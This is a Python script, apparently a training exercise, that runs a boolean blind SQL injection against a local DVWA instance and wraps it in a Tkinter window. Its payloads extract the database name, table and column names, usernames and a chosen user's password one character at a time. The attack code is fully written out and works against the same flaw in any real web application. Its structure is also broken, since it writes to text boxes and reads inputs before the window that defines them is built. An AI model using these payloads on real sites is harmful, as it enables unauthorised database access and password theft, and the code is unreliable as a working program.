import tkinter as tk

from utils import *

def get_query_result(s, sqli_blind_url, query, *args):
    try:
        concrete_query = query.format(*args)
        response = s.get(f"{sqli_blind_url}?id={concrete_query}&Submit=Submit#")
        parser = DVWASQLiResponseParser(response)
        return parser.check_presence("exist")
    except AttributeError as e:
        return False

if __name__ == "__main__":
    BASE_URL = "http://127.0.0.1/dvwa"
    sqli_blind_url = f"{BASE_URL}/vulnerabilities/sqli_blind"
    
    with DVWASessionProxy(BASE_URL) as s:
        s.security = SecurityLevel.LOW


        query = "1' AND LENGTH(DATABASE()) = {} %23"
        length = 0
        for i in range(10):
            if get_query_result(s, sqli_blind_url, query, i):
                print(f"[+] The DB's name length is {i}")
                textbox4.insert(tk.END,"[+] The DB's name length is {i}")
                length = i

        
        query = "1' AND SUBSTRING(DATABASE(), {}, 1) = '{}'%23"
        dbname = []

        for i in range(1, length+1):
            for c in string.ascii_lowercase:
                if get_query_result(s, sqli_blind_url, query, i, c):
                    dbname.append(c)
                    break
        dbname = "".join(dbname)
        print(f'[+] Found a database with name: {dbname}')
        textbox4.insert(tk.END,f'[+] Found a database with name: {dbname}')
        
        
        query = "1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_type='base table' AND table_schema='{}')='{}'%23"
        n_tables = 0
        for i in range(1, 10):
            if get_query_result(s, sqli_blind_url, query, dbname, i):
                print(f"[+] It has {i} tables")
                textbox4.insert(tk.END,f"[+] It has {i} tables")
                n_tables = i
                break


        query = "1' AND SUBSTR((SELECT table_name from information_schema.tables WHERE table_type='base table' AND table_schema='{}' {} LIMIT 1),{},1)='{}'%23"
        
        found_tables = [[] for _ in range(n_tables)]
        completion = ""
        for i in range(n_tables):        
            for j in range(1, 10):
                for c in string.ascii_lowercase:
                    if get_query_result(s, sqli_blind_url, query, dbname, completion, j, c):
                        found_tables[i].append(c)
                        break
            print("\t","".join(found_tables[i]))
            textbox4.insert(tk.END,"\t","".join(found_tables[i]))
            completion += f" AND table_name <> '{''.join(found_tables[i])}'"
        
            
    
    # users_table = input("Type the tabname to attack: ")
    users_table = tabname
    query = "1' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='{}')='{}'%23"
    
    n_columns = 0
    for i in range(1, 10):
        if get_query_result(s, sqli_blind_url, query, users_table, i):
            print(f"[+] It has {i} columns")
            textbox5.insert(tk.END,f"[+] It has {i} columns")
            n_columns = i
            break

    query = "1' AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='{}' LIMIT {}, 1),{},1)='{}'%23"
    
    found_columns = [[] for _ in range(n_columns)]
    
    print("[!] In order to speed up, try to press CTRL+C when you find the user and password columns")
    textbox5.insert(tk.END,"[!] In order to speed up, try to press CTRL+C when you find the user and password columns")
    try:
        for i in range(n_columns):        
            for j in range(1, 12):
                for c in string.ascii_lowercase:
                    if get_query_result(s, sqli_blind_url, query, users_table, i, j, c):
                        found_columns[i].append(c)
                        
                        break
            print("\t","".join(found_columns[i]))
    except KeyboardInterrupt as e:
        print("\nSkipping this phase!")
        textbox5.insert(tk.END,"\nSkipping this phase!")
        
    

    # users_column = input("Type the name of the column containing usernames: ")
    # passwords_column = input("Type the name of the column containing passwords: ")
    users_column = user_input
    passwords_column = password_input

    query = "1' AND SUBSTR((SELECT {} FROM {} LIMIT {}, 1),{},1)='{}'%23"
    
    found_users = [[] for _ in range(10)]
    
    print("[!] In order to speed up, try to press CTRL+C when you find the target user")
    textbox6.insert(tk.END,"[!] In order to speed up, try to press CTRL+C when you find the target user")
    try:
        for i in range(10):        
            for j in range(1, 12):
                for c in string.ascii_letters+string.digits:
                    if get_query_result(s, sqli_blind_url, query, users_column, users_table, i, j, c):
                        found_users[i].append(c)
                        
                        break
            print("|","_"*10,"".join(found_users[i]))
            textbox6.insert(tk.END,"|","_"*10,"".join(found_users[i]))
    except KeyboardInterrupt as e:
        print("\n Skipping this phase!")
        textbox6.insert(tk.END,"\n Skipping this phase!")
    
    # username = input("Type the name of the target user: ")
    username = target_user

    query = "1' AND LENGTH((SELECT {} FROM {} WHERE {}='{}'))={}%23"
    pwd_length = 0
    for i in range(100):
        
        if get_query_result(s, sqli_blind_url, query, passwords_column, users_table, users_column, username, i ):
            pwd_length = i
            print(f"[+] The password length is: {i}")
            textbox7.insert(tk.END,f"[+] The password length is: {i}")
        
    query = "1' AND SUBSTR((SELECT {} FROM {} WHERE {}='{}' LIMIT 1), {}, 1)='{}'%23"
    password = []
    for j in range(1, pwd_length+1):
        
        for c in string.ascii_letters+string.digits:
            
            if get_query_result(s, sqli_blind_url, query, passwords_column, users_table, users_column, username, j, c):
                password.append(c)
                
                break
    print("[+] Password is: ","".join(password))
    textbox7.insert(tk.END,"[+] Password is: ","".join(password))







    window = tk.Tk()
    window.title("Tkinter Text Boxes")

# Row 1, Column 0
# label1 = tk.Label(window, text="First Step")
# label1.grid(row=0, column=0, padx=10, pady=5, sticky="e")
# textbox1 = tk.Text(window, wrap=tk.WORD, height=1, width=20)
# textbox1.grid(row=0, column=1, padx=10, pady=5)

# Row 1, Column 1
    label2 = tk.Label(window, text="Type the tabname to attack:")
    label2.grid(row=1, column=2, padx=10, pady=5, sticky="e")
    textbox2 = tk.Text(window, wrap=tk.WORD, height=1, width=20)
    textbox2.grid(row=1, column=3, padx=10, pady=5)
    tabname = textbox2.get("1.0","end-1c")

# Row 1, Column 2 (First Text Box)
    label3 = tk.Label(window, text="Type the name of column containing usernames:")
    label3.grid(row=0, column=4, padx=10, pady=5, sticky="e")
    textbox3_1 = tk.Text(window, wrap=tk.WORD, height=1, width=20)
    textbox3_1.grid(row=0, column=5, padx=10, pady=5)
    user_input = textbox3_1.get("1.0","end-1c")

# Row 1, Column 2 (Second Text Box)
    label4 = tk.Label(window, text="Type the name of the column containing passwords:")
    label4.grid(row=1, column=4, padx=10, pady=5, sticky="e")
    textbox3_2 = tk.Text(window, wrap=tk.WORD, height=1, width=20)
    textbox3_2.grid(row=1, column=5, padx=10, pady=5)
    password_input = textbox3_2.get("1.0","end-1c")


    label5 = tk.Label(window, text="Type the name of the column containing passwords:")
    label5.grid(row=1, column=7, padx=10, pady=5, sticky="e")
    textbox_target_user = tk.Text(window, wrap=tk.WORD, height=1, width=20)
    textbox_target_user.grid(row=1, column=8, padx=10, pady=5)
    target_user = textbox_target_user.get("1.0","end-1c")

# Row 2, Text Box 4 (Read-Only)
    label4 = tk.Label(window, text="Text Box 4")
    label4.grid(row=2, column=0, padx=10, pady=5, sticky="e")
    frame4 = tk.Frame(window)
    frame4.grid(row=2, column=1, padx=10, pady=5)
    textbox4 = tk.Text(frame4, wrap=tk.WORD, height=5, width=20)
    textbox4.insert(tk.END, "")
#textbox4.config(state=tk.DISABLED)
    textbox4.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
    scrollbar4 = tk.Scrollbar(frame4, command=textbox4.yview)
    scrollbar4.pack(side=tk.RIGHT, fill=tk.Y)
    textbox4.config(yscrollcommand=scrollbar4.set)

# Row 2, Text Box 5 (Read-Only)
    label5 = tk.Label(window, text="Text Box 5")
    label5.grid(row=2, column=2, padx=10, pady=5, sticky="e")
    frame5 = tk.Frame(window)
    frame5.grid(row=2, column=3, padx=10, pady=5)
    textbox5 = tk.Text(frame5, wrap=tk.WORD, height=5, width=20)
    textbox5.insert(tk.END, "")
#textbox5.config(state=tk.DISABLED)
    textbox5.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
    scrollbar5 = tk.Scrollbar(frame5, command=textbox5.yview)
    scrollbar5.pack(side=tk.RIGHT, fill=tk.Y)
    textbox5.config(yscrollcommand=scrollbar5.set)

# Row 2, Text Box 6 (Read-Only)
    label6 = tk.Label(window, text="Text Box 6")
    label6.grid(row=2, column=4, padx=10, pady=5, sticky="e")
    frame6 = tk.Frame(window)
    frame6.grid(row=2, column=5, padx=10, pady=5)
    textbox6 = tk.Text(frame6, wrap=tk.WORD, height=5, width=20)
    textbox6.insert(tk.END, "")
#textbox6.config(state=tk.DISABLED)
    textbox6.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
    scrollbar6 = tk.Scrollbar(frame6, command=textbox6.yview)
    scrollbar6.pack(side=tk.RIGHT, fill=tk.Y)
    textbox6.config(yscrollcommand=scrollbar6.set)

    label7 = tk.Label(window, text="Text Box 7")
    label7.grid(row=2, column=7, padx=10, pady=5, sticky="e")
    frame7 = tk.Frame(window)
    frame7.grid(row=2, column=8, padx=10, pady=5)
    textbox7 = tk.Text(frame7, wrap=tk.WORD, height=5, width=20)
    textbox7.insert(tk.END, "")
#textbox7.config(state=tk.DISABLED)
    textbox7.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
    scrollbar7 = tk.Scrollbar(frame7, command=textbox7.yview)
    scrollbar7.pack(side=tk.RIGHT, fill=tk.Y)
    textbox7.config(yscrollcommand=scrollbar7.set)

# Run the application
    window.mainloop()